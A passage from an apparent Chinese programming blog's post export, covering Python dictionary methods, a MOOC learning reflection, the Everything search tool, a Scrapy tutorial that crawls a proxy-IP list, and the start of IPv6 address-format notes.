    <content type="text"><![CDATA[字典是Python中唯一内建的映射类型（哈希表）。字典中的值并没有特殊的顺序，但是都存储在一个特定的键下。键可以是数字、字符串甚至是元组。 字典中的键是唯一的，但值并不唯一。 字典对象是可变的，但是字典的键必须使用不可变对象，并且一个字典中可以使用不同类型的键值。 创建字典使用{}直接创建123&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; 使用工厂方法dict()1234&gt;&gt;&gt; items = [(&apos;name&apos;,&apos;fzy&apos;),(&apos;age&apos;,&apos;22&apos;),(&apos;class&apos;,&apos;13-3&apos;)]&gt;&gt;&gt; d = dict(items)&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; dict函数也可以通过关键字参数来创建字典。 123&gt;&gt;&gt; d = dict(name=&apos;fzy&apos;,age=&apos;22&apos;)&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;&#125; 使用内建方法fromkeys()创建’默认‘字典，字典中元素具有相同的value，如果没有给出，默认为None。 12&gt;&gt;&gt; &#123;&#125;.fromkeys((&apos;x&apos;,&apos;y&apos;),-1)&#123;&apos;y&apos;: -1, &apos;x&apos;: -1&#125; 基本字典操作自动添加d[key]=values将值values关联到键key上。即使键起初在字典中并不存在，也可以为其赋值，会建立新的项。 访问字典中的值d[key]返回关联到键key上的值。 判断成员资格直接使用key访问：key不存在会报错，可以使用had_key()或者in和not in判断。 len操作len(dict)返回dict中键值对的数量。 123&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; len(d)3 del操作del d[key]删除字典d中键值为key的元素，也可以使用del删除整个字典。 123456789&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; del d[&apos;class&apos;]&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;&#125;&gt;&gt;&gt; del d&gt;&gt;&gt; dTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;NameError: name &apos;d&apos; is not defined 遍历字典方法一： 1234567&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;, &apos;age&apos;:&apos;22&apos;, &apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; for key in d:... print key,d[key]...age 22name fzyclass 13-3 方法二： 1234567&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;, &apos;age&apos;:&apos;22&apos;, &apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; for key,value in d.items():... print key,value...age 22name fzyclass 13-3 字典方法clearclear()方法清除字典中所有的项。 1234&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.clear()&gt;&gt;&gt; d&#123;&#125; copycopy()方法返回一个具有相同键值对的新字典。在复制的时候，使用的是浅拷贝，复制了对象，但是对象中的元素，依然使用引用。 浅拷贝与深拷贝 浅拷贝：没有拷贝子对象，所以原始数据改变，子对象会改变 深拷贝：包含对象里面的自对象的拷贝，所以原始对象的改变不会造成深拷贝里任何子元素的改变 12345678&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;course&apos;:[&apos;python&apos;,&apos;java&apos;,&apos;c++&apos;]&#125;&gt;&gt;&gt; c = d.copy()&gt;&gt;&gt; c[&apos;name&apos;] = &apos;xxx&apos;&gt;&gt;&gt; c[&apos;course&apos;].remove(&apos;c++&apos;)&gt;&gt;&gt; c&#123;&apos;course&apos;: [&apos;python&apos;, &apos;java&apos;], &apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;xxx&apos;&#125;&gt;&gt;&gt; d&#123;&apos;course&apos;: [&apos;python&apos;, &apos;java&apos;], &apos;age&apos;: &apos;22&apos;, &apos;name&apos;: &apos;fzy&apos;&#125; 当副本中替换值时，原字典不受影响，但是，如果修改了某个值，原字典也会改变。 避免这个问题的一种方法就是使用深复制，复制其包含的所有值。（可以使用copy模块的deepcopy函数来实现） items和iteritemsitems()方法将字典所有的项以列表方式返回。列表的每一项都表示为键值对的形式，但是项再返回时没有特定的次序。 123&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.items()[(&apos;age&apos;, &apos;22&apos;), (&apos;name&apos;, &apos;fzy&apos;), (&apos;class&apos;, &apos;13-3&apos;)] iteritems()方法与items()方法类似，但是会返回一个迭代器对象而不是列表。 12345&gt;&gt;&gt; it = d.iteritems()&gt;&gt;&gt; it&lt;dictionary-itemiterator object at 0x02AFF750&gt;&gt;&gt;&gt; list(it) #把迭代对象转换成列表[(&apos;age&apos;, &apos;22&apos;), (&apos;name&apos;, &apos;fzy&apos;), (&apos;class&apos;, &apos;13-3&apos;)] keys和iterkeyskeys()方法返回字典中键的列表，而iterkeys()方法返回字典中键的迭代器。 12345678&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.keys()[&apos;age&apos;, &apos;name&apos;, &apos;class&apos;]&gt;&gt;&gt; it = d.iterkeys()&gt;&gt;&gt; it&lt;dictionary-keyiterator object at 0x02AFFB40&gt;&gt;&gt;&gt; list(it) #把迭代对象转换成列表[&apos;age&apos;, &apos;name&apos;, &apos;class&apos;] values和itervaluesvalues()方法返回字典中所有值的列表，而itervalues()方法返回值的迭代器。 12345678&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.values()[&apos;22&apos;, &apos;fzy&apos;, &apos;13-3&apos;]&gt;&gt;&gt; it = d.itervalues()&gt;&gt;&gt; it&lt;dictionary-valueiterator object at 0x02AFF8A0&gt;&gt;&gt;&gt; list(it) #把迭代对象转换成列表[&apos;22&apos;, &apos;fzy&apos;, &apos;13-3&apos;] has_keyhas_key(key)判断字典中是否存在key，Python3.0中不包括这个函数，建议使用 in 和 not in 代替。 123456&gt;&gt;&gt; d = &#123; &#125;&gt;&gt;&gt; d.has_key(&apos;name&apos;)False&gt;&gt;&gt; d[&apos;name&apos;] = &apos;fzy&apos;&gt;&gt;&gt; d.has_key(&apos;name&apos;)True fromkeysfromkeys(seq,val=None)方法以seq中的元素为键创建并返回一个字典，val为指定的默认值。 12&gt;&gt;&gt; &#123;&#125;.fromkeys((&apos;x&apos;,&apos;y&apos;),-1)&#123;&apos;y&apos;: -1, &apos;x&apos;: -1&#125; getget(key,default=None)方法是个更宽松的访问字典项的方法，访问字典中不存在的项时不会出错。键存在时，get方法返回键对应的值，如果该键不存在，则返回default指定的值，不指定default参数时默认返回None。 1234567&gt;&gt;&gt; d = &#123; &#125;&gt;&gt;&gt; print d[&apos;name&apos;]Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;KeyError: &apos;name&apos;&gt;&gt;&gt; print d.get(&apos;name&apos;)None pop和popitempop(key，default)方法用来获得对应于给定键的值，然后将这个键值对从字典中移除。 12345&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.pop(&apos;age&apos;)&apos;22&apos;&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; popitem()类似于list.pop，但是list.pop弹出列表的最后一个元素，popitem弹出随机的项，因为字典是无序的，并没有“最后的元素”或者其他有关顺序的概念。 12345&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; d.popitem()(&apos;age&apos;, &apos;22&apos;)&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; updateupdate()方法可以利用一个字典项更新另一个字典。 12345&gt;&gt;&gt; d = &#123;&apos;name&apos;:&apos;fzy&apos;,&apos;age&apos;:&apos;22&apos;,&apos;class&apos;:&apos;13-3&apos;&#125;&gt;&gt;&gt; x = &#123;&apos;age&apos;:&apos;18&apos;,&apos;school&apos;:&apos;hunau&apos;&#125;&gt;&gt;&gt; d.update(x)&gt;&gt;&gt; d&#123;&apos;age&apos;: &apos;18&apos;, &apos;school&apos;: &apos;hunau&apos;, &apos;name&apos;: &apos;fzy&apos;, &apos;class&apos;: &apos;13-3&apos;&#125; 提供的字典中的项会被添加到旧的字典中，若有相同的键则会进行覆盖。 setdefaultsetdefault(key,default=None)方法能够获得与给定值相关联的值，并且在字典中不含有给定键的情况下设定相应的键值。 123456789&gt;&gt;&gt; d = &#123; &#125;&gt;&gt;&gt; d.setdefault(&apos;name&apos;,&apos;fzy&apos;)&apos;fzy&apos;&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;&#125;&gt;&gt;&gt; d.setdefault(&apos;name&apos;,&apos;111&apos;)&apos;fzy&apos;&gt;&gt;&gt; d&#123;&apos;name&apos;: &apos;fzy&apos;&#125; 由上可知，当键不存在的时候，setdefault返回默认值并且相应地更新字典。如果键存在，那么就返回与其对应的值，但是不改变字典。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习慕课这两年]]></title>
    <url>%2F2017%2F01%2F12%2F%E5%AD%A6%E4%B9%A0%E6%85%95%E8%AF%BE%E8%BF%99%E4%B8%A4%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[算起来，我学习慕课已经有两年多的时间了，从一开始接触的网易公开课，到后来的中国大学MOOC，以及慕课网、极客学院等IT教育类网站，再到近期了解到的学堂在线、Coursera、以及综合MOOC搜索网站：MOOC学院等，这期间，收获很大，感悟也很多。 这是最好的时代也是最坏的时代。 越来越多的大学开始投入大量的资金制作慕课，也有越来越多的公司开始搞在线教育的业务，开发了很多在线的课程，我们开始享受到越来越丰富的教育资源，一方面，即使你只是在一所普通的大学，只要你想学，网络已经给我们提供了很多的资源，这在一定程度上，缓解了教育资源分布不均的问题。另一方面，丰富的慕课课程给大家终身学习提供了有利的保障，即使你已经毕业，或者已经步入社会，你同样可以像在学校那样接受教育，来再次提升自己各方面的能力。 但是，同样的问题又来了。就像吴军博士在智能时代中说的那样：虽然这是一个非常有希望的时代，这是一个最好的时代，也是一个最坏的时代。因为好坏看你站在哪个角度，你是否参与了，你参与进来，对你来说就是一个最好的时代。如果你拒绝这件事情，可能对你来说未来就是一个很坏的时代。 对于慕课时代，如果你充分利用起这些慕课资源在不断地学习，那么你是参与进来了，对于你来说这是个最好的时代，但是如果你拒绝了这件事情，别人在努力提升自己，而你不愿意参与，差距就会慢慢拉开，对你来说就会是一种威胁，这就是一个最坏的时代。虽然，这样看起来总是在竞争，会感觉很累，但是这样社会才会进步。 对于我个人来说，这两年累计达上千个小时的学习对我来说有着非常重要的意义，一方面，我通过慕课网站学习了一些国内外一流大学的课程，接受到了更好的教育，使我对一些课程理解更加深刻，另一方面，也是更重要的一点，我们的大学大多是通识教育，不会教太多技术性的东西，但是IT技术类的慕课弥补了这个缺陷，通过这些课程的学习，我掌握了很多软件开发技能，这对于今后的发展也是至关重要的。 学习慕课这两年，渐渐明白：教育是一辈子的事情，笑到最后的是一辈子接受教育的人，一定要树立终生学习的观念。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[推荐-效率搜索工具：Everything]]></title>
    <url>%2F2017%2F01%2F05%2F%E6%8E%A8%E8%8D%90-%E6%95%88%E7%8E%87%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%EF%BC%9AEverything%2F</url>
    <content type="text"><![CDATA[还在为找不到磁盘中的文件而困扰吗？还在为Windows自带文件检索工具速度太慢而苦恼吗？不用担心，Everything帮你来搞定。 Everything，一个非常小巧的文件搜索软件，它只有几百KB，但作为一个快速检索的工具，它麻雀虽小五脏俱全，最重要的是它比系统自带的搜索快很多，非常实用。 Everything简介Everything是一款集性能与速度于一身的搜索工具，它是基于NTFS文件系统的特定来实现快速检索的。它也需要建索引，但是索引文件非常小，100多G的硬盘大约也就几M到十几M的索引文件，而且建立速度非常快，大约几秒钟就建立完成了。搜索速度呢，快到你不可想象，一般不会超过2秒钟！！更强大的是，它支持正则表达式搜索。 它不仅可以检索单个关键词，还能同时空格多个关键词来检索，特殊字符，文件后缀，也没问题，还能按文件名、修改时间等对检索结果排序。绝对是你在日积月累的电脑文件中翻照片、找文档的利器。 官网地址：http://www.voidtools.com/ 下载方式官网下载安装（推荐）一般下载软件最好是到官方网站去下载，这样下载下来的一定是纯净版，这样可以避免很多不必要的麻烦。 下载地址：http://www.voidtools.com/downloads/ 根据电脑系统的位数以及自己的需要下载相应的版本，然后双击下载的exe文件进行安装。 360软件管家下载安装如果你的电脑安装了360，那么你可以打开360软件管家搜索Everything，然后点击安装即可，方便快捷。 百度搜索寻找资源（不推荐）大家也可以到百度搜索Everything，马上可以找到这个软件的很多下载资源，但是并不推荐这么做，首先，很多软件下载网站都有很多广告，一不小心点错就下载了另一个软件，另外，还有一些网站提供的软件会有捆绑安装其他软件，所以比较麻烦。 你可能会问Everything为什么这么快？Everything是一个运行于Windows系统，基于文件、文件夹名称的快速搜索引擎。 Everything在搜索之前就会把所用的文件和文件夹都列出来，这一点与Windows自带的搜索系统不一样，所以我们称之为Everything。 在搜索框输入文字，它就会只显示过滤后的文件和目录。 Everything搜索文件内容吗？不，Everything不搜索文件内容，只搜索文件和文件夹名称。 Everything是不是非常占用系统资源？不，Everything使用非常少的系统资源。一个刚安装完的Windows XP SP2系统(约20,000份文件)需要占用3-5 mb内存和不到1 mb的硬盘空间。一百万份文件大概需要45 mb内存和5 mb硬盘空间。 如何搜索文件或文件夹？在搜索编辑中键入部分文件或文件夹名称，结果会立即显示。 如何搜索文件类型？要搜索的文件类型，输入文件扩展名搜索编辑，即搜索MP3文件类型，键入 .MP3到搜索编辑。要搜索多种类型的文件类型，请使用| 到单独的文件类型，如 .BMP | * .JPG将搜索扩展名为BMP或JPG文件。 如何在特定位置搜索文件和文件夹？要搜索特定位置中的文件和文件夹，请在搜索字符串中包含\。 如何使用布尔运算符？AND是默认的布尔运算符。例如，下面是如何搜索ABC和123：ABC 123 要搜索以下两种搜索词，添加| 之间的术语。例如，下面是如何搜索.jpg或.BMP：.JPG | .BMP 要排除的东西从搜索中包括！在术语的前面。例如，下面是如何搜索，除了ABC一切：！ABC 如何使用正则表达式？正则表达式，又称规则表达式，它是计算机科学的一个概念。正则表通常被用来检索、替换那些符合某个模式(规则)的文本。 点击Everything菜单栏中的帮助，选择正则表达式语法选项即可看到如下界面，使用正在表达式进行搜索。 使用示例： 搜索G:\Python学习路径下的所有py格式的文件，这里使用*.py来使其匹配所有py格式的文件。]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>软件</tag>
        <tag>工具</tag>
        <tag>Everything</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫框架：Scrapy]]></title>
    <url>%2F2016%2F12%2F26%2FPython%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%EF%BC%9AScrapy%2F</url>
    <content type="text"><![CDATA[Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架。它使用 Twisted这个异步网络库来处理网络通讯，架构清晰，并且包含了各种中间件接口，可以灵活的完成各种需求。学习Python爬虫有一段时间了，但是也是最近才接触到如此强大的Scrapy，它比BeautifulSoup更加完善，BeautifulSoup可以说是轮子，而Scrapy则是车子，不需要你关注太多的细节。 需要注意的是：Scrapy仅仅支持Python 2.7。 安装Scrapy1pip install Scrapy pip 是一个Python包管理工具，主要是用于安装 PyPI 上的软件包，可以替代 easy_install 工具。没有安装过的建议安装一下，经常用到，具体安装教程请自行百度。 创建项目Windows下，打开命令提示符窗口，进入到打算存储代码的目录中，使用下面的命令创建一个scrapy项目。 1scrapy startproject 项目名 项目结构文件管理器打开该目录可以看到多了scrapy项目的文件夹，进入文件夹可以看到如下这些文件： scrapy.cfg: 项目的配置文件 项目名/: 该项目的python模块。之后我们将在此加入代码。 项目名/items.py: 项目中的item文件. 项目名/pipelines.py: 项目中的pipelines文件. 项目名/settings.py: 项目的设置文件. 项目名/spiders/: 放置spider代码的目录. 定义要抓取的数据：Item爬取的主要目标就是从非结构性的数据源提取结构性数据，例如网页。 Scrapy提供 Item 类来满足这样的需求。 Item 是保存爬取到的数据的容器；其使用方法和python字典类似， 并且提供了额外保护机制来避免拼写错误导致的未定义字段错误。 Item 对象是种简单的容器，保存了爬取到得数据。 其提供了 类似于词典(dictionary-like) 的API以及用于声明可用字段的简单语法。 默认生成的items.py文件如下： 12345678910111213# -*- coding: utf-8 -*-# Define here the models for your scraped items## See documentation in:# http://doc.scrapy.org/en/latest/topics/items.htmlimport scrapyclass IpspiderItem(scrapy.Item): # define the fields for your item here like: # name = scrapy.Field() pass 我们可以scrapy.Field()定义一些字段，例如name、sex等。 编写提取item数据的SpiderSpider是用户编写用于从单个网站(或者一些网站)爬取数据的类。其包含了一个用于下载的初始URL，如何跟进网页中的链接以及如何分析页面中的内容， 提取生成 item 的方法。 为了创建一个Spider，您必须继承 scrapy.Spider 类，且定义以下三个属性: name: 用于区别Spider。 该名字必须是唯一的，您不可以为不同的Spider设定相同的名字。 start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。 parse() 是spider的一个方法。 被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。 123456789101112/spiders/__init__.py的大致框架如下：import scrapyclass DmozSpider(scrapy.Spider): name = &quot;这里定义爬虫的名字&quot; start_urls = [ 这里填写起始的网址 ] def parse(self, response): 这里处理请求得到的数据，以及跳转到下一页 Selectors选择器Scrapy提取数据有自己的一套机制。它们被称作选择器(seletors)，因为他们通过特定的 XPath 或者 CSS 表达式来“选择” HTML文件中的某个部分。 Selector有四个基本的方法: xpath(): 传入xpath表达式，返回该表达式所对应的所有节点的selector list列表 。 css(): 传入CSS表达式，返回该表达式所对应的所有节点的selector list列表. extract(): 序列化该节点为unicode字符串并返回list。 re(): 根据传入的正则表达式对数据进行提取，返回unicode字符串list列表。 XPath 是一门用来在XML文件中选择节点的语言，也可以用在HTML上。 CSS 是一门将HTML文档样式化的语言。选择器由它定义，并与特定的HTML元素的样式相关连。 我们可以使用浏览器的开发者工具来得到我们所需节点的xpath表达式，然后通过xpath()方法来得到其内容，如下： 1response.xpath(&apos;xpath表达式&apos;) 假设，spider抓取到的html文档如下： 123456789101112131415&lt;html&gt; &lt;head&gt; &lt;base href=&apos;http://example.com/&apos; /&gt; &lt;title&gt;Example website&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&apos;images&apos;&gt; &lt;a href=&apos;image1.html&apos;&gt;Name: My image 1 &lt;br /&gt;&lt;img src=&apos;image1_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image2.html&apos;&gt;Name: My image 2 &lt;br /&gt;&lt;img src=&apos;image2_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image3.html&apos;&gt;Name: My image 3 &lt;br /&gt;&lt;img src=&apos;image3_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image4.html&apos;&gt;Name: My image 4 &lt;br /&gt;&lt;img src=&apos;image4_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;a href=&apos;image5.html&apos;&gt;Name: My image 5 &lt;br /&gt;&lt;img src=&apos;image5_thumb.jpg&apos; /&gt;&lt;/a&gt; &lt;/div&gt; &lt;/body&gt;&lt;/html&gt; 例如，要得到title标签内的内容，xpath表达式应该写成： 1//title/text() 为了提取真实的原文数据，你需要调用 .extract() 方法如下: 123response.xpath(&apos;//title/text()&apos;).extract()结果如下：[u&apos;Example website&apos;] 如你所见， .xpath()方法返回一个类 SelectorList 的实例, 它是一个新选择器的列表。这个API可以用来快速的提取嵌套数据。 再比如，要得到a标签中的链接，应该这样做： 123for sel in response.xpath(&apos;//div/a&apos;).extract(): #得到含有所有a标签的列表，遍历列表依次取出其中的链接 url = sel.xpath(&apos;/@href&apos;) #使用@得到属性值 print url 关于xpath的语法这里只是举了两个简单的例子，详细的语法可以参考网上其他教程。 示例程序我们通过编写一个爬取有代理：12月21号 国内代理ip服务器列表的爬虫来练习scrapy的基本使用。 地址如下：http://www.youdaili.net/Daili/guonei/25083.html 新建项目1scrapy startproject IpSpider 分析页面打开浏览器的开发者工具，快捷键f12，笔记本可能需要fn键+f12. （1）定位数据 点击控制台左上角的图标，然后鼠标箭头移动到代理ip列表的一条记录，通过分析我们可以知道所有的记录都是存放在一个p标签下的span标签里面，所以我们可以先找到所有的p标签，然后得到p标签下span标签的内容即为我们所需要的代理ip和地址数据。 那么，如何得到所有的p标签呢？ 鼠标选中列表中第一个ip地址，右键copy，然后copy xpath，得到如下： /html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1] 第二个ip地址的xpath为： /html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1] 依次类推： 使用response.xpath(‘/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p’)即可得到所有的p标签，即列表的所有项。 如何得到p标签下span标签的内容呢？ 我们copy一下p标签下任意一个span标签得到xpath为：/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p[1]/span 上一步中我们得到了一个包含所有p标签的列表，然后我们遍历这个列表，依次取出每个p标签中span的内容，如下： 12for sel in response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p&apos;): sel.xpath(&apos;span/text()&apos;) 这样我们就可以分别得到每一个列表项，即每一条代理ip地址信息。 （2）分析数据格式 由上图可知，代理ip列表的每一项有一条ip信息，我们要获取的ip信息位于字符串的@符号之前，地址信息位于#符号与空格之间，这是我们处理数据的关键所在。 （3）跳转到下一页继续爬取 在第一页时： 在第最后一页时： 每次需要得到下一页按钮的链接，到最后一页时，下一页按钮的链接会变成#号，因此我们只要判断得到的链接不是#号就代表还有下一页，每次得到下一页的链接我们就把它传入Request函数，并yield这个Request让爬虫继续发送请求，爬取下一个页面。 123456pagenum = &apos;&apos;.join(response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[4]/li[8]/a/@href&apos;).extract()) print pagenum if pagenum != &apos;#&apos;: nexturl = &apos;http://www.youdaili.net/Daili/guonei/&apos; + pagenum print nexturl yield Request(nexturl, callback=self.parse) #爬取下一页 编写代码12345678910111213141516171819202122232425262728IpSpider/spiders/__init__.py的代码如下：# -*- coding: utf-8 -*-import scrapyfrom IpSpider.items import IpspiderItemfrom scrapy.http import Request class IpSpider(scrapy.Spider): name = &quot;ip&quot; start_urls = [&quot;http://www.youdaili.net/Daili/guonei/25083.html&quot;] def parse(self, response): for sel in response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[3]/p&apos;): item = IpspiderItem() s = &apos;&apos;.join(sel.xpath(&apos;span/text()&apos;).extract()) item[&apos;ip&apos;] = s[0:s.rfind(&apos;@&apos;,1)] #切分字符串，只取ip item[&apos;address&apos;] = s[s.rfind(&apos;#&apos;,1)+1:s.rfind(&apos; &apos;,1)] #切分字符串，取出#号和空格之间的地址 yield item #处理下一页 pagenum = &apos;&apos;.join(response.xpath(&apos;/html/body/div[5]/div[1]/div[1]/div[3]/div[4]/li[8]/a/@href&apos;).extract()) print pagenum if pagenum != &apos;#&apos;: nexturl = &apos;http://www.youdaili.net/Daili/guonei/&apos; + pagenum print nexturl yield Request(nexturl, callback=self.parse) #爬取下一页 123456789IpSpider/items.py的代码如下：import scrapyclass IpspiderItem(scrapy.Item): # define the fields for your item here like: ip = scrapy.Field() #ip字段 address = scrapy.Field() #地址字段 pass pipelines.py和settings.py我们暂时不需处理，待下次深入学习scrapy再来修改。 开始爬取进入项目的根目录，执行crawl命令启动spider: 只执行程序，不保存数据： 1scrapy crawl ip 执行程序，并输出保存数据： 1scrapy crawl ip -o ip.json 该命令将采用 JSON 格式对爬取的数据进行序列化，生成 ip.json 文件。 也可以采用 CSV 格式对爬取的数据进行序列化： 1scrapy crawl ip -o ip.csv 将生成 ip.csv 文件。 效果如下：]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPv6学习笔记(一)]]></title>
    <url>%2F2016%2F12%2F19%2FIPv6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%80%2F</url>
    <content type="text"><![CDATA[IPv6是Internet Protocol Version 6的缩写，IPv6是IETF（互联网工程任务组，Internet Engineering Task Force）设计的用于替代现行版本IP协议（IPv4）的下一代IP协议，号称可以为全世界的每一粒沙子编上一个网址。 此篇博客主要学习IPv6的特点、IPv6数据报格式、IPv6地址格式与分类。 IPv6与IPv4比较IPv4的局限性 IP地址枯竭 报头过于复杂,使网络节点处理效率不高 NAT技术破坏了端到端应用模型，不安全 地址配置与使用不够简便 IPv4协议本身的安全性不足 QoS功能难以满足显示要求 IPv6的技术优势 超大的地址空间，地址增加了2^96倍 自动配置用户地址，提供即插即用功能，路由器可以简单路过选项而不做任何处理，加快了处理速度 全球重新部署，有规划，易于实现聚合 报头简单，加快报文转发，提高了吞吐量，能通过扩展报头技术可实现新技术 IPv6支持永远在线，为人们提供更友好的服务 内置的安全机制，如IPSec 增强了对移动IP的支持 IPv4与IPv6对比表 比较内容 IPv6 IPv4 地址空间 2的128次方，足够大 2的32次方，约42亿 表示方法 冒号十六进制 点分十进制 安全性 采用标准的方法，以支持全球范围的内部网接入和虚拟专用网 几个可选方法，每个可选方法都有由有限的地址空间引起的扩展性问题 移动IP网络配置 规模可支持全球移动终端IPv6标准的一个完整的组成部分 可支持有限数量的终端，无综合的标准化解决方案 IPv6数据报 IPv6数据报基本结构（1）Ipv6报头 Ipv6报头由40个字节的固定长度组成，相比Ipv4报头，删去了报头长度、标示、标志、检验和等字段。 （2）扩展报头 在IPv6中用扩展报头来代替Ipv4中的部分选项字段。新的扩展报头格式增强了IPv6的功能，使其具有极大的扩展性。 （3）上层协议数据单元 由上层协议报头和有效载荷构成。有效载荷可以是ICMPv6报文、TCP报文、UDP报头等。 IPv6数据报的报头格式 版本号(version) 不同的IP协议版本使用不同的数据报格式。 通信量等级(Traffic Classes) 使得源节点和路由器能够识别IPv6信息包的优先级。与IPv4服务类型TOS字段含义类似。 流标签(Flow Label) 标记那些需要IPv6路由器特殊处理(如一种非默认服务质量或实时服务)的信息包顺序。 有效负载长度(Payload Length) 定长40字节数据报首部后面的字节数量，包括扩展报头和负载数据，即数据报长度-40。 下一个首部(Next Header) 当IPv6没有扩展报头时，该字段的作用和IPv4的上层协议字段一样。当含有扩展报头时，该字段的值即为第一个扩展报头的类型。 跳限制(Hop Limit) 转发数据报的每台路由器对该字段的值减1，若减为0则丢弃该数据报。 128位源IP地址(Source Address) 128位目的IP地址(Destnation Address) IPv6地址格式 IPv6二进位制下为128位元长度 以16位元为一组，每组以冒号”:”隔开 可以分为8组，每组以4位元十六进制方式表示 首选格式IPv6地址表示为冒号分十六进制格式 例如： 21DA:00D3:0000:0000:02AA:00FF:FE22:9C5A 压缩表示压缩规则1：每项数字前导的0可以省略，省略后前导数字仍是0则继续。例如，以下IP地址都是等价的： 123452001:0DB8:02de:0000:0000:0000:0000:0e132001:DB8:2de:0000:0000:0000:0000:e132001:DB8:2de:000:000:000:000:e132001:DB8:2de:00:00:00:00:e132001:DB8:2de:0:0:0:0:e13 压缩规则2：可以用双冒号”::”表示一组0或多组连续的0 122001:DB8:2de:0:0:0:0:e132001:DB8:2de::e13 不过一个IPv6地址只允许使用一次“::”，请注意有的情形下省略是非法的. 12001::25de::cade 因为它有可能是下种情形之一，造成无法推断。12342001:0000:0000:0000:0000:25de:0000:cade2001:0000:0000:0000:25de:0000:0000:cade2001:0000:0000:25de:0000:0000:0000:cade2001:0000:25de:0000:0000:0000:0000:cade 内嵌IPv4地址的IPv6地址表示IPv4兼容IPv6地址 例如：::192.168.1.2 IPv4映射IPv6地址 例如：::FFFF:192.168.1.2 地址前缀IPv6地址的地址前缀同IPv4中的CIDR一样，依然使用“地址/前缀长度”表示，例如：2001:da8:0:2::/64 所有无状态自动配置的地址的前缀都是fe80，其后64位是由48位的MAC地址生成的. IPv6地址类型 